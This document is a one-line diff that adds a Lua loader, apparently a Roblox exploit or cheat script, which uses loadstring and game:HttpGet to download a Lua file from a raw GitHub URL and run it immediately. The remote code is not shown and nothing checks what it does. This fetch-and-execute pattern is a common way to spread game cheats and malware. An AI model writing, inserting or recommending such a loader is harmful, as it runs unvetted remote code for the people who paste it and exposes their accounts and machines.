@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/solowef/qqgoohod/main/77_IJ4UZEHS1.lua'))()
